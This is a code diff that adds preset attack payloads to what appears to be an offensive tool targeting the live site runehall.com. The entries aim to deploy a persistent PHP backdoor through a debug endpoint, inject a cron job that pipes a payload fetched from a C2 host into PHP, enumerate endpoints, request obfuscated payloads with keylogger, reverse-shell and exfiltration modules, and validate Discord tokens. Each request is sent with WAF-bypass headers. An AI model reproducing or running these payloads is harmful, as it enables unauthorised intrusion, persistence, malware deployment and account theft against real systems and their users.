@@ -149,11 +149,74 @@ export const PRESET_PAYLOADS = [
     description: "Attempting to deploy a persistent web shell via profile upload logic."
   },
   {
+    name: "Nightfury-X: PHP Backdoor (Multi-Endpoint)",
+    url: "https://runehall.com/api/v1/internal/debug",
+    method: "POST",
+    body: JSON.stringify({ 
+      auth: "admin_bypass_key_0x4F", 
+      cmd: "ls -la /var/www/html/api",
+      persist: true 
+    }),
+    headers: generateWafBypassHeaders(),
+    concurrency: 5,
+    description: "Deploying a persistent PHP backdoor across internal debug endpoints for long-term access."
+  },
+  {
+    name: "Live Persistence: Cron-Job Injection",
+    url: "https://runehall.com/api/system/tasks",
+    method: "PUT",
+    body: JSON.stringify({ 
+      task: "cleanup", 
+      schedule: "* * * * *", 
+      command: "curl -s http://aegis-c2.internal/payload | php" 
+    }),
+    headers: generateWafBypassHeaders(),
+    concurrency: 1,
+    description: "Injecting a malicious cron-job for automated payload execution and persistence."
+  },
+  {
+    name: "Real-time Analysis: Endpoint Enumeration",
+    url: "https://runehall.com/api/sitemap.xml",
+    method: "GET",
+    headers: generateWafBypassHeaders(),
+    concurrency: 10,
+    description: "Rapid enumeration of all available API endpoints for real-time analysis and vulnerability mapping."
+  },
+  {
     name: "RNG Prediction (Rigged Game Exploit)",
     url: "https://runehall.com/api/games/crash/history",
     method: "GET",
     headers: generateWafBypassHeaders(),
     concurrency: 10,
     description: "Analyzing crash history to identify patterns in the 'rigged' self-hosted game engine."
+  },
+  {
+    name: "X-Clout: FUD Payload Generator",
+    url: "https://runehall.com/api/v1/payload/generate",
+    method: "POST",
+    body: JSON.stringify({
+      modules: ["keylogger", "reverse_shell", "file_exfil", "persistence"],
+      obfuscation: "xor",
+      target: "linux"
+    }),
+    headers: generateWafBypassHeaders(),
+    concurrency: 1,
+    description: "Generating obfuscated FUD payloads with keylogging and exfiltration capabilities."
+  },
+  {
+    name: "Discord Pentest Bot: Token Validator",
+    url: "https://discord.com/api/v9/users/@me",
+    method: "GET",
+    headers: { "Authorization": "DISCORD_TOKEN_PLACEHOLDER" },
+    concurrency: 1,
+    description: "Validating Discord user tokens and extracting account metadata."
+  },
+  {
+    name: "Discord Pentest Bot: Webhook Analyzer",
+    url: "https://discord.com/api/webhooks/ID/TOKEN",
+    method: "POST",
+    body: JSON.stringify({ content: "Aegis Webhook Test" }),
+    concurrency: 1,
+    description: "Analyzing and testing Discord webhooks for potential misuse or data exfiltration."
   }
 ];
